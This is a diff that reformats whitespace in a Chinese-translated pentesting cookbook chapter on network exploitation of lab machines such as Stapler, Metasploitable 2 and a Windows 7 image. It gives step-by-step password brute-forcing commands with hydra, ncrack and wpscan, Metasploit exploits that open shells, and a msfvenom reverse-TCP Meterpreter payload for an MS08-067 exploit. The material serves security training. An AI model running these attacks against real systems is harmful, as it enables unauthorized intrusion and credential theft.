@@ -1,4 +1,4 @@
-# 第四章。网络利用
+# 第四章：网络利用
 
 在本章中，我们将涵盖以下内容：
 
@@ -52,9 +52,9 @@ gunzip rockyou.txt.gz
 1.  使用以下命令在子网上发现 Stapler 的 IP 地址：
 
 ```
-    nbtscan (x.x.x.1-255)
+nbtscan (x.x.x.1-255)
 
-    ```
+```
 
 输出如下屏幕截图所示：
 
@@ -63,9 +63,9 @@ gunzip rockyou.txt.gz
 1.  运行快速的`nmap`扫描以查找可用端口：
 
 ```
-    nmap -sT -T4 -sV -p 1-65535 <IP address>
+nmap -sT -T4 -sV -p 1-65535 <IP address>
 
-    ```
+```
 
 输出如下屏幕截图所示：
 
@@ -100,9 +100,9 @@ gunzip rockyou.txt.gz
 使用以下命令枚举 WordPress 用户：
 
 ```
-     wpscan -u https://<IP address>:12380/blogblog/ --enumerate u
+ wpscan -u https://<IP address>:12380/blogblog/ --enumerate u
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -113,9 +113,9 @@ gunzip rockyou.txt.gz
 在这里，我们将收集有助于建立潜在凭证列表的信息。让我们看看这是如何可能的。我们将在机器上运行`enum4linux`，使用以下命令：
 
 ```
-    enum4linux <IP address>
+enum4linux <IP address>
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -136,9 +136,9 @@ gunzip rockyou.txt.gz
 让我们对 Metasploitable 2 机器做同样的操作。在我们的测试实验室中，Metasploitable 2 机器托管在`192.168.157.152`。我们已经创建了一个自定义的`grep`，它将枚举用户的共享，并且只给出用户名作为输出：
 
 ```
-    enum4linux <IP address> | grep "user:" |cut -d "[" -f2 | cut           -d "]" -f1
+enum4linux <IP address> | grep "user:" |cut -d "[" -f2 | cut           -d "]" -f1
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -147,9 +147,9 @@ gunzip rockyou.txt.gz
 完成后，将用户名保存在任何名称的文件中。在这种情况下，我们将其命名为`metasploit_users`。这可以通过使用以下命令重定向前面命令的输出来完成：
 
 ```
-    enum4linux <IP address> | grep "user:" |cut -d "[  " -f2 |           cut -d "]  " -f1 > metasploit_users
+enum4linux <IP address> | grep "user:" |cut -d "[  " -f2 |           cut -d "]  " -f1 > metasploit_users
 
-    ```
+```
 
 有了这个，我们已经完成了信息收集的第一个步骤，以建立一个可信的凭证字典。在下一个步骤中，我们将看看如何利用这一点来攻击并尝试访问服务器。
 
@@ -166,9 +166,9 @@ gunzip rockyou.txt.gz
 1.  知道我们的用户名列表叫做`username`，确保终端指向用户名文件所在的路径。我们将在终端中运行以下命令：
 
 ```
-    hydra -e nsr -L username <IP address> ftp
+hydra -e nsr -L username <IP address> ftp
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -234,9 +234,9 @@ hydra -e nsr -L username <IP address> ftp
 1.  我们将使用 Hydra 来破解 Stapler 上 SSH 服务的密码。在终端中输入以下命令：
 
 ```
-    hydra -e nsr -L username <IP address> ssh -t 4
+hydra -e nsr -L username <IP address> ssh -t 4
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -245,10 +245,10 @@ hydra -e nsr -L username <IP address> ftp
 1.  也可以使用 Patator 进行检查；在终端中输入以下命令：
 
 ```
-     patator ssh_login host=<IP address> user=SHayslett
-    password-FILE0 0=username
+ patator ssh_login host=<IP address> user=SHayslett
+password-FILE0 0=username
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -259,9 +259,9 @@ hydra -e nsr -L username <IP address> ftp
 1.  我们可以尝试使用从 Metasploitable 2 获得的用户；这次我们将使用`ncrack`命令来破解密码。让我们尝试找到`sys`账户的登录。在终端中输入以下命令，对我们的 Metasploitable 2 机器上的`sys`执行 SSH 密码破解攻击：
 
 ```
-    ncrack -v --user sys -P /usr/share/wordlists/rockyou.txt       ssh://<IP address>
+ncrack -v --user sys -P /usr/share/wordlists/rockyou.txt       ssh://<IP address>
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -327,9 +327,9 @@ WPScan 是一个 WordPress 扫描器。它有许多功能，比如枚举 WordPre
 1.  我们将首先使用枚举用户脚本枚举可用的 WordPress 登录。在终端中输入以下命令：
 
 ```
-    wpscan -u https://<IP address>:12380/blogblog/ --enumerate u
+wpscan -u https://<IP address>:12380/blogblog/ --enumerate u
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -338,9 +338,9 @@ WPScan 是一个 WordPress 扫描器。它有许多功能，比如枚举 WordPre
 1.  要开始破解密码，我们将从 Kali 中提供的可用字典中提供 wordlist 文件，例如`rockyou.txt`。在终端中输入以下命令：
 
 ```
-    wpscan -u https://<IP address>:12380/blogblog/ --wordlist        /usr/share/wordlists/rockyou.txt  --threads 50
+wpscan -u https://<IP address>:12380/blogblog/ --wordlist        /usr/share/wordlists/rockyou.txt  --threads 50
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -349,9 +349,9 @@ WPScan 是一个 WordPress 扫描器。它有许多功能，比如枚举 WordPre
 1.  让我们检查密码是否有效。访问登录页面：
 
 ```
-    https://x.x.x.x:12380/blogblog/wp-login.php
+https://x.x.x.x:12380/blogblog/wp-login.php
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -384,14 +384,14 @@ WPScan 具有相当多的功能。它允许用户枚举安装的主题、插件�
 1.  一旦您进入 Metasploit 控制台，输入以下命令：
 
 ```
-          use auxiliary/scanner/mysql/mysql_login
-          set username root
-          set stop_on_success true
-          set rhosts <Target IP address>
-          set pass_file /usr/share/wordlists/rockyou.txt
-          exploit
+      use auxiliary/scanner/mysql/mysql_login
+      set username root
+      set stop_on_success true
+      set rhosts <Target IP address>
+      set pass_file /usr/share/wordlists/rockyou.txt
+      exploit
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -402,11 +402,11 @@ WPScan 具有相当多的功能。它允许用户枚举安装的主题、插件�
 1.  现在让我们尝试破解 Postgres 凭据。在 Metasploit 终端中输入以下内容：
 
 ```
-          use auxiliary/scanner/postgres/postgres_login
-          set rhosts <Target IP address>
-          run
+      use auxiliary/scanner/postgres/postgres_login
+      set rhosts <Target IP address>
+      run
 
-    ```
+```
 
 扫描器将启动，并且任何成功的尝试都将以绿色突出显示。请查看以下截屏：
 
@@ -445,10 +445,10 @@ Metasploit 是一个丰富的框架。建议查看其他扫描器模块和为基
 1.  一旦你进入 Metasploit 控制台，输入以下命令：
 
 ```
-     CAT -h 192.168.1.88 -w /root/Desktop/cisco_users -a
-    /root/Desktop/cisco_pass
+ CAT -h 192.168.1.88 -w /root/Desktop/cisco_users -a
+/root/Desktop/cisco_pass
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -493,10 +493,10 @@ IP 不同，因为作者已经更改了内部网络的 VLAN。
 1.  启动 PostgreSQL，然后启动`msfconsole`：
 
 ```
-          service postgresql start
-          msfconsole
+      service postgresql start
+      msfconsole
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -505,14 +505,14 @@ IP 不同，因为作者已经更改了内部网络的 VLAN。
 1.  我们将利用`vsftpd`漏洞。在运行`msfconsole`的终端中输入以下内容：
 
 ```
-          search vsftpd
-          use exploit/unix/ftp/vsftpd_234_backdoor
-          set rhost <Target IP Address>
-          set payload cmd/unix/interact
-          set lhost <Your IP Address>
-          exploit
+      search vsftpd
+      use exploit/unix/ftp/vsftpd_234_backdoor
+      set rhost <Target IP Address>
+      set payload cmd/unix/interact
+      set lhost <Your IP Address>
+      exploit
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -521,13 +521,13 @@ IP 不同，因为作者已经更改了内部网络的 VLAN。
 1.  利用成功运行，并且我们已经进入了系统的根目录。让我们来看看我们在对 Metasploitable 2 进行漏洞评估扫描时发现的另一个漏洞。在终端中输入以下命令：
 
 ```
-          search distcc
-          use exploit/unix/misc/distcc_exec
-          set payload cmd/unix/bind_perl
-          set rhost <Target IP address>
-          exploit
+      search distcc
+      use exploit/unix/misc/distcc_exec
+      set payload cmd/unix/bind_perl
+      set rhost <Target IP address>
+      exploit
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -564,9 +564,9 @@ Metasploit 还提供了社区版的图形界面版本。建议查看一下。可
 1.  一旦 Windows 7 镜像被下载，运行一个`nmap`扫描以找到可用的服务。在终端中运行以下命令：
 
 ```
-    nmap -sT -sV -T4 -p 1-65535  <IP address>
+nmap -sT -sV -T4 -p 1-65535  <IP address>
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -587,12 +587,12 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  我们将首先测试 FTP。在 Metasploit 控制台中输入以下命令开始：
 
 ```
-          use exploit/windows/ftp/kmftp_utility_cwd
-          set rhost <Target IP address>
-          set payload windows/shell_bind_tcp
-          exploit
+      use exploit/windows/ftp/kmftp_utility_cwd
+      set rhost <Target IP address>
+      set payload windows/shell_bind_tcp
+      exploit
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -601,12 +601,12 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  我们成功地得到了一个 shell。现在让我们测试 Easy File Sharing HTTP Server。在 Metasploit 终端中输入以下命令：
 
 ```
-          use exploit/windows/http/easyfilesharing_seh
-          set rhost <Target IP address>
-          set payload windows/shell_bind_tcp
-          exploit
+      use exploit/windows/http/easyfilesharing_seh
+      set rhost <Target IP address>
+      set payload windows/shell_bind_tcp
+      exploit
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -615,12 +615,12 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  我们也成功地完成了这个：我们得到了一个 shell。现在，让我们检查最后一个软件，Blue Coat 身份验证和授权代理，看看它是否容易受到利用。在 Metasploit 终端中输入以下命令：
 
 ```
-          use exploit/windows/misc/bcaaa_bof
-          set rhost <Target IP address>
-          set payload windows/shell_bind_tcp
-          exploit
+      use exploit/windows/misc/bcaaa_bof
+      set rhost <Target IP address>
+      set payload windows/shell_bind_tcp
+      exploit
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -651,9 +651,9 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  首先让我们看看如何使用`searchsploit`在`exploit-db`数据库中搜索`ms08-067`漏洞，使用以下命令：
 
 ```
-    searchsploit ms08-067
+searchsploit ms08-067
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -666,11 +666,11 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  所以我们必须首先编辑代码，并将我们想要执行的有效载荷指向我们的 IP 地址和端口。为了做到这一点，我们将使用`msfvenom`创建我们的有效载荷，以便我们可以让这个脚本执行。在 Kali 终端上输入以下命令，为 Kali IP 创建一个用于反向连接的 Python shell 代码：
 
 ```
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali IP
-    Address> LPORT=443 EXITFUNC=thread -b "x00x0ax0dx5cx5fx2f
-    x2ex40" -f python -a x86
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali IP
+Address> LPORT=443 EXITFUNC=thread -b "x00x0ax0dx5cx5fx2f
+x2ex40" -f python -a x86
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -689,14 +689,14 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  一旦代码被替换，保存并关闭文件。启动 Metasploit，并输入以下命令，在 Kali 机器上的端口`443`上启动监听器，就像我们创建有效载荷时提到的那样：
 
 ```
-          msfconsole
-          use exploit/multi/handler
-          set payload windows/meterpreter/reverse_tcp
-          set lhost <Kali IP address>
-          set lport 443
-          exploit
+      msfconsole
+      use exploit/multi/handler
+      set payload windows/meterpreter/reverse_tcp
+      set lhost <Kali IP address>
+      set lport 443
+      exploit
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -705,9 +705,9 @@ Easy File Sharing HTTP Server 7.2 也有漏洞。让我们看看它们是否可�
 1.  现在，一旦我们的处理程序启动，我们将执行 Python 脚本，并提到目标 IP 地址和操作系统。转到已编辑文件被复制的桌面，并执行 Python 文件。由于它存储在桌面上，执行以下命令：
 
 ```
-    python 40279.py 192.168.1.11.1
+python 40279.py 192.168.1.11.1
 
-    ```
+```
 
 输出将如下截图所示：
 
